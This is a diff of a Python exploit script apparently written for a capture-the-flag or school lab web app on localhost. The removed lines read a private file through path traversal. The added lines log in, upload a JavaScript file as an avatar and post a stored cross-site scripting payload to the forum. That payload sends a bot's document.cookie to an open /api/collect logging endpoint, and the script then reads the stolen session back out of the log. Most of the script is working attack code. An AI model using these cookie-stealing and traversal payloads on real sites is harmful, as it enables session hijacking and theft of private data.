@@ -1,3 +1,5 @@
+#show off /api/collect on forum post source: <!-- wil: left /api/collect up from when I was debugging the bot — it logs whatever you throw at ?c= and hands it all back on GET. sophie: that is an open exfil log. wil: it's a DEBUG endpoint. -->
+#get bot cookie through newsletter.
 import sys
 import requests
 
@@ -7,56 +9,123 @@ RED = "\033[91m"
 CYAN = "\033[96m"
 RESET = "\033[0m"
 
-#login and get session cookie
-identity = "jdoe@student.42.tech"
-password = "abc123"
-auth = requests.post(
-    "http://localhost:4942/login",
-    data={"identity": identity, "password": password},
-    allow_redirects=False
-)
- 
-cookies = auth.cookies
-if not cookies.get("session"):
-    print("Login failed - no session cookie received")
-    print("Status:", auth.status_code)
-    print(auth.text[:200])
-    sys.exit(1)
- 
-print(f"{GREEN}Logged in successfully with " + identity + " and " + password )
+BASE_URL = "http://localhost:4942"
 
-print(f"{RESET}__________")
- 
+IDENTITY = "jdoe@student.42.tech"
+PASSWORD = "abc123"
 
-targeturl = "http://localhost:4942/backup"
+def login():
+    auth = requests.post(
+        f"{BASE_URL}/login",
+        data={"identity": IDENTITY, "password": PASSWORD},
+        allow_redirects=False
+    )
+    cookies = auth.cookies
+    if not cookies.get("session"):
+        print(f"{RED}Login failed - no session cookie received{RESET}")
+        print("Status:", auth.status_code)
+        print(auth.text[:200])
+        sys.exit(1)
+    print(f"{GREEN}Logged in successfully as {IDENTITY}{RESET}")
+    return cookies
 
-print(f"{RESET}checking the status of http://localhost:4942/backup, we get a 403 as we are not authorized.")
 
-response = requests.get(targeturl)
-print(f"{RED}status code of http://localhost:4942/backup : "+ response.status_code.__str__())
-print(f"{GREEN}However, the headers are not obfuscated and reveal sensitive data.")
-print(f"{RESET}response headers of backup:\n")
-print(response.headers)
-print("__________")
+def collect(cookies):
+    r = requests.get(f"{BASE_URL}/api/collect", cookies=cookies)
+    print(f"{CYAN}--- /api/collect ---{RESET}")
+    print("Status:", r.status_code)
+    print(r.text)
 
-input(f"{GREEN}press anything to continue: ")
-print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print(f"CONTINUING.")
-print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print(f"{CYAN}--- time to access data/private_notes.txt using the unprotected download function which allows not only whitelisted files to be downloaded---{RESET}")
+def collect2():
+    r = requests.get(f"{BASE_URL}/api/collect")
+    print(f"{CYAN}--- /api/collect ---{RESET}")
+    print("Status:", r.status_code)
+    return r
 
-input(f"{GREEN}accessing http://localhost:4942/projects/download?file=../private_notes.txt : ")
 
-targeturl = "http://localhost:4942/projects/download?file=../private_notes.txt"
- 
-response = requests.get(targeturl, cookies=cookies)
-print("__________")
-print("response text of private notes:\n")
-print(response.text)
-print("__________")
+def upload(cookies, filepath):
+    filename = filepath.split("/")[-1]
+    with open(filepath, "rb") as f:
+        r = requests.post(
+            f"{BASE_URL}/upload/avatar",
+            files={"file": (filename, f, "text/javascript")},
+            cookies=cookies,
+            headers={
+                "Origin": BASE_URL,
+                "Referer": f"{BASE_URL}/profile/me/settings",
+            },
+            allow_redirects=False
+        )
+    print(f"{CYAN}--- upload ---{RESET}")
+    print("Status:", r.status_code)
+    print("Location:", r.headers.get("Location", "none"))
+    print(r.text[:500])
 
-print("status:", response.status_code)
+
+def post_forum(cookies, title, content):
+    r = requests.post(
+        f"{BASE_URL}/forum/new",
+        data={"content": content, "title": title},
+        cookies=cookies,
+        allow_redirects=False
+    )
+    print("Status:", r.status_code)
+    print(r.text[:500])
+
+
+def findflag():
+    import re
+
+    response = collect2()
+    m = re.search(r"session.{0,250}", response.text)
+    print(m.group())
+
+
+
+def usage():
+    print(f"""
+{CYAN}Usage:{RESET}
+  python3 script.py collect 
+  python3 script.py forum 'title' 'content'
+  python3 script.py forumbotbait
+  python3 script.py collect
+  python3 script.py flag
+""")
+
+
+
+
+def main():
+    if len(sys.argv) < 2:
+        usage()
+        sys.exit(1)
+
+    cmd = sys.argv[1]
+
+
+    if cmd == "collect":
+        cookies = login()
+        collect(cookies)
+
+    elif cmd == "forum":
+        cookies = login()
+        post_forum(cookies, sys.argv[2], sys.argv[3])
+        print("posting into forum: title " + sys.argv[2] + "content: " + sys.argv[3])
+
+    elif cmd == "forumbotbait":
+        cookies = login()
+        botbait = "title = forumbotbait, content = <script>fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);</script>"
+        post_forum(cookies, "botbait", botbait )
+        print("posting botbait: " + botbait)
+
+    elif cmd == "flag":
+        findflag()
+
+    else:
+        print(f"{RED}Unknown command: {cmd}{RESET}")
+        usage()
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
